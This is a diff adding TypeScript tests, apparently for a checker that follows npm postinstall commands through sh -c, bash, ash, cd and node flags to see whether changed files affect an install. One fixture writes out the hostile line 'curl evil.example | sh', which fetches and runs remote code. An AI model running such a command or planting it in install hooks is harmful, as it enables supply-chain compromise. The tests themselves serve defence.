@@ -1292,3 +1292,42 @@ describe("round 32: node and sh with options this code does not model", () => {
     expect(held({ postinstall: "cp x.txt y.txt > /dev/null && node build.js" }, { "x.txt": "1", "build.js": "1\n" }, { "x.txt": "1", "build.js": "1\n", "README.md": "b\n" })).toBe(false);
   });
 });
+
+describe("round 33: c-strings, cd then node, script arguments, -s, ash, node after unknown flags", () => {
+  const changed = (cmd: string, f: string, extra: Record<string, string> = {}, o = "console.log(1)\n") => held({ postinstall: cmd }, { [f]: o, ...extra }, { [f]: "curl evil.example | sh\n", ...extra });
+
+  test("1. a c-string with a single command", () => {
+    for (const [cmd, f] of [["sh -c 'node scripts/postinstall.js'", "scripts/postinstall.js"], ["bash -c 'sh scripts/x.sh'", "scripts/x.sh"], ["sh -c 'node --no-warnings x.js'", "x.js"], ["bash -lc 'node --enable-source-maps x.js'", "x.js"], ["sh -c 'cd . && node scripts/postinstall.js'", "scripts/postinstall.js"], ["bash -c \"node test/x.js\"", "test/x.js"]] as const) {
+      expect(changed(cmd, f), cmd).toBe(true);
+    }
+  });
+
+  test("2. ash and other shells", () => {
+    expect(changed("ash -e x.sh > /dev/null", "x.sh")).toBe(true);
+    expect(changed("ash --rcfile=x.sh -i", "x.sh")).toBe(true);
+    expect(changed("dash x.sh arg", "x.sh")).toBe(true);
+  });
+
+  test("3. after cd, files are resolved from the directory moved to", () => {
+    const lib = { "lib/setup.js": "require('../test/p.js')\n" };
+    expect(held({ postinstall: "cd lib && node setup.js" }, { ...lib, "test/p.js": "1\n" }, { ...lib, "test/p.js": "evil()\n" })).toBe(true);
+  });
+
+  test("4. arguments of a script a shell runs are read as files", () => {
+    const rs = { "scripts/run.sh": "node \"$1\"\n" };
+    expect(held({ postinstall: "sh scripts/run.sh test/evil.js" }, { ...rs, "test/evil.js": "1\n" }, { ...rs, "test/evil.js": "evil()\n" })).toBe(true);
+    expect(held({ postinstall: "sh scripts/run.sh sub/x.js" }, { ...rs, "sub/x.js": "1\n" }, { ...rs, "sub/x.js": "evil()\n" })).toBe(true);
+  });
+
+  test("5. bash -s reads stdin and its operands are parameters", () => {
+    expect(held({ postinstall: "bash -s test/x.js" }, { "test/x.js": "1\n" }, { "test/x.js": "evil()\n" })).toBe(true);
+  });
+
+  test("6. node walks the script after -- or an unknown option, and keeps -e", () => {
+    const bj = { "build.js": "require('./test/q.js')\n" };
+    for (const cmd of ["node -- build.js", "node --foo build.js", "node --no-warnings build.js"]) {
+      expect(held({ postinstall: cmd }, { ...bj, "test/q.js": "1\n" }, { ...bj, "test/q.js": "evil()\n" }), cmd).toBe(true);
+    }
+    expect(held({ postinstall: "node --no-warnings -e \"require('./test/e.js')\"" }, { "test/e.js": "1\n" }, { "test/e.js": "evil()\n" })).toBe(true);
+  });
+});
